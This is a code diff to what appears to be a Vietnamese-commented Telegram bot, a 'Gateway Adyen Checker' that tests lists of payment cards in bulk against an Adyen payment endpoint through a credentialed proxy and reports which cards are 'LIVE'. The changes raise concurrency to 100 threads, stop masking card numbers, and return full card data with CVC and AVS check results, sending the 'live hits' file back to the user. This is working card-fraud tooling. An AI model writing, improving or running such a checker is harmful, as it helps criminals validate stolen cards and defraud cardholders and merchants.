@@ -265,7 +265,7 @@ def generate_okhttp_profile():
     return {"client_identifier": selected_id, "user_agent": user_agent}
 
 # ===================================================================
-# === PHẦN 4: HÀM CHECK THẺ (CORE LOGIC)
+# === PHẦN 4: HÀM CHECK THẺ (CORE LOGIC) - ĐÃ CẬP NHẬT
 # ===================================================================
 
 def check_card_core(line_card):
@@ -276,12 +276,12 @@ def check_card_core(line_card):
     normalized = normalize_card(line_card)
     
     if not normalized:
-        return "ERROR", "Format Error", f"{line_card} - Format Error"
+        return "ERROR", "Format Error", f"{line_card}|N/A|N/A|N/A|N/A|N/A|Format Error"
 
     cc, mm, yyyy, cvc = normalized.split('|')
 
     if not validate_luhn(cc):
-        return "ERROR", "Luhn Error", f"{cc[:6]}...{cc[-4:]} - Luhn Fail"
+        return "ERROR", "Luhn Error", f"{cc}|{mm}|{yyyy}|{cvc}|N/A|N/A|N/A|N/A|Luhn Error"
 
     # Cấu hình API Key
     ADYEN_PUB_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F"
@@ -292,9 +292,6 @@ def check_card_core(line_card):
     success_request = False
     max_retries = 3
     current_try = 0
-    
-    message = "UNK"
-    resultCode = "UNK"
     
     # Retry Loop
     while current_try < max_retries:
@@ -348,7 +345,7 @@ def check_card_core(line_card):
             c.setopt(pycurl.POSTFIELDS, post_body)
             c.setopt(pycurl.HTTPHEADER, headers_list)
             
-            # Proxy Configuration (Giữ nguyên từ code gốc)
+            # Proxy Configuration (Giữ nguyên)
             proxy_url = "http://aus.360s5.com:3600"
             proxy_auth = "88634867-zone-custom-region-JP:AetOKcLB"
             c.setopt(pycurl.PROXY, proxy_url)
@@ -378,29 +375,48 @@ def check_card_core(line_card):
         time.sleep(1)
 
     if not success_request:
-        return "ERROR", "Network Fail", f"{cc}|{mm}|{yyyy}|{cvc} - Network/Proxy Error"
+        return "ERROR", "Network Fail", f"{cc}|{mm}|{yyyy}|{cvc}|N/A|N/A|N/A|N/A|N/A|N/A|Network Fail"
 
+    # Trích xuất dữ liệu đầy đủ theo yêu cầu
     additionalData = data.get('additionalData', {})
+    
+    cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
     cvcResult = additionalData.get('cvcResult', 'N/A')
+    avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
     avsResult = additionalData.get('avsResult', 'N/A')
+    
     refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')
-    refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))
+    refusalReason = data.get('refusalReason', refusalReasonRaw)
+    
     resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
     message = data.get('message', 'N/A')
 
-    full_resp = f"{cc}|{mm}|{yyyy}|{cvc}|{resultCode}|{refusalReason}|{message}"
-
+    # Xác định trạng thái và Msg hiển thị cuối
+    final_msg = message
     if resultCode == "Authorised" or resultCode == "Cancelled":
-        return "LIVE", "APPROVED ✅", full_resp
+        status_main = "LIVE"
+        short_msg = "APPROVED ✅"
+        final_msg = "APPROVED"
     elif resultCode == "Refused":
-        return "DIE", f"Refused - {refusalReason}", full_resp
+        status_main = "DIE"
+        short_msg = f"Refused - {refusalReason}"
+        final_msg = refusalReason if refusalReason != 'N/A' else message
     elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
-        return "DIE", "3DS Required", full_resp
+        status_main = "DIE"
+        short_msg = "3DS Required"
+        final_msg = "3D Secure"
     else:
-        return "DIE", f"UNK - {message}", full_resp
+        status_main = "DIE"
+        short_msg = f"UNK - {message}"
+
+    # ĐỊNH DẠNG CHUỖI KẾT QUẢ ĐẦY ĐỦ:
+    # {cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg}
+    full_resp = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{final_msg}"
+
+    return status_main, short_msg, full_resp
 
 # ===================================================================
-# === PHẦN 5: BOT LOGIC & MULTI-THREADING
+# === PHẦN 5: BOT LOGIC & MULTI-THREADING (ĐÃ NÂNG LÊN 100 LUỒNG)
 # ===================================================================
 
 class UserStats:
@@ -432,12 +448,12 @@ def worker_bot(q, stats):
         stats.processed += 1
         if status == "LIVE":
             stats.live += 1
-            # Gửi tin nhắn Live riêng
+            # Gửi tin nhắn Live riêng (Format đầy đủ)
             try:
-                bot.send_message(stats.chat_id, f"✅ <b>LIVE:</b> <code>{raw_res}</code>", parse_mode='HTML')
+                bot.send_message(stats.chat_id, f"✅ <b>LIVE - APPROVED</b> ✅\n<code>{raw_res}</code>", parse_mode='HTML')
             except: pass
             
-            # Lưu file local
+            # Lưu file local (Format đầy đủ)
             with open(f"live_{stats.chat_id}.txt", "a") as f:
                 f.write(raw_res + "\n")
                 
@@ -451,7 +467,7 @@ def worker_bot(q, stats):
 def update_dashboard(chat_id, stats):
     """Luồng riêng để update tin nhắn thống kê"""
     while stats.is_running and stats.processed < stats.total:
-        time.sleep(3.5) # Update mỗi 3.5s để tránh FloodWait
+        time.sleep(3.5) # Update mỗi 3.5s
         
         elapsed = time.time() - stats.start_time
         if elapsed == 0: elapsed = 1
@@ -461,7 +477,7 @@ def update_dashboard(chat_id, stats):
         ram_usage = psutil.virtual_memory().percent
         
         text = (
-            f"<b>⚡ GATEWAY ADYEN CHECKER ⚡</b>\n"
+            f"<b>⚡ GATEWAY ADYEN CHECKER (100 THREADS) ⚡</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
             f"📂 File: <b>{stats.filename}</b>\n"
             f"✅ Live: <b>{stats.live}</b>\n"
@@ -496,7 +512,7 @@ def update_dashboard(chat_id, stats):
         # Gửi file kết quả nếu có live
         if os.path.exists(f"live_{chat_id}.txt"):
             with open(f"live_{chat_id}.txt", "rb") as f:
-                bot.send_document(chat_id, f, caption="File Live Hits")
+                bot.send_document(chat_id, f, caption="File Live Hits (Full Format)")
             os.remove(f"live_{chat_id}.txt")
     except: pass
 
@@ -504,7 +520,7 @@ def update_dashboard(chat_id, stats):
 def send_welcome(message):
     bot.reply_to(message, 
                  "👋 Chào mừng!\n\n"
-                 "1. Gửi file <code>.txt</code> chứa thẻ để check Bulk.\n"
+                 "1. Gửi file <code>.txt</code> chứa thẻ để check Bulk (100 Threads).\n"
                  "2. Dùng lệnh <code>/st cc|mm|yy|cvv</code> để check lẻ.",
                  parse_mode='HTML')
 
@@ -523,12 +539,15 @@ def check_single_card(message):
         
         if status == "LIVE":
             icon = "✅"
+            header = "LIVE - APPROVED ✅"
         elif status == "DIE":
             icon = "❌"
+            header = "DIE"
         else:
             icon = "⚠️"
+            header = "ERROR"
             
-        resp_text = f"{icon} <b>{status}</b> - {short_msg}\n<code>{full_res}</code>"
+        resp_text = f"{icon} <b>{header}</b>\n<code>{full_res}</code>"
         bot.edit_message_text(resp_text, chat_id=message.chat.id, message_id=msg_wait.message_id, parse_mode='HTML')
         
     except Exception as e:
@@ -565,7 +584,7 @@ def handle_file(message):
         
         # Gửi bảng Dashboard ban đầu
         sent_msg = bot.send_message(chat_id, 
-                                    f"🚀 Đang chuẩn bị chạy {len(cards)} thẻ...", 
+                                    f"🚀 Đang chuẩn bị chạy {len(cards)} thẻ với 100 luồng...", 
                                     parse_mode='HTML')
         stats.message_id = sent_msg.message_id
         
@@ -576,8 +595,8 @@ def handle_file(message):
         for c in cards:
             q.put(c)
             
-        # Chạy 10 luồng (có thể điều chỉnh)
-        num_threads = 10
+        # Chạy 100 luồng theo yêu cầu
+        num_threads = 100
         threads = []
         for _ in range(num_threads):
             t = threading.Thread(target=worker_bot, args=(q, stats))
